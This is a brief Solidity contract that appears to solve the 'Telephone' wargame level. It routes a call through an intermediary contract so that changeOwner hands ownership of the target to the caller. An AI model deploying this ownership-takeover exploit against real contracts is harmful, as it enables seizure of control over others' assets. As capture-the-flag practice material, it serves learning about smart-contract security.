// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract CALLtheTelephone{
    Telephone public telephoneContract;

    constructor(address _telephoneContract) public{
        telephoneContract = Telephone(_telephoneContract);
    }

    function CALL() external{
        telephoneContract.changeOwner(msg.sender);
    }
}
